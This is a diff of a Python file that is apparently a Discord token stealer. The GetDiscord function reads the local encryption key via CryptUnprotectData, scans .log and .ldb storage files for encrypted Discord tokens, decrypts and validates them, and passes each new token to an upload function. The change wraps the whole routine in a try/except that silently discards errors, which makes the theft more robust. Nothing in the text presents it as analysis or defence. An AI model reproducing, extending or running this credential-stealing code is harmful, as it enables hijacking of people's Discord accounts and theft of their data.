@@ -1206,25 +1206,28 @@ def getTokq(path, arg):
                                 uploadTokq(Tokq, path)
 
 def GetDiscord(path, arg):
-    if not os.path.exists(f"{path}/Local State"): return
+    try:
+        if not os.path.exists(f"{path}/Local State"): return
 
-    pathC = path + arg
+        pathC = path + arg
 
-    pathKey = path + "/Local State"
-    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
-    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-    master_key = CryptUnprotectData(master_key[5:])
-    
-    for file in os.listdir(pathC):
-        if file.endswith(".log") or file.endswith(".ldb"):
-            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
-                for Tokq in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                    global Tokqs
-                    TokqDecoded = decrval(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
-                    if checkTokq(TokqDecoded):
-                        if not TokqDecoded in Tokqs:
-                            Tokqs += TokqDecoded
-                            uploadTokq(TokqDecoded, path)
+        pathKey = path + "/Local State"
+        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
+        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+        master_key = CryptUnprotectData(master_key[5:])
+        
+        for file in os.listdir(pathC):
+            if file.endswith(".log") or file.endswith(".ldb"):
+                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
+                    for Tokq in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        global Tokqs
+                        TokqDecoded = decrval(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
+                        if checkTokq(TokqDecoded):
+                            if not TokqDecoded in Tokqs:
+                                Tokqs += TokqDecoded
+                                uploadTokq(TokqDecoded, path)
+    except:
+        pass
 
 
                 
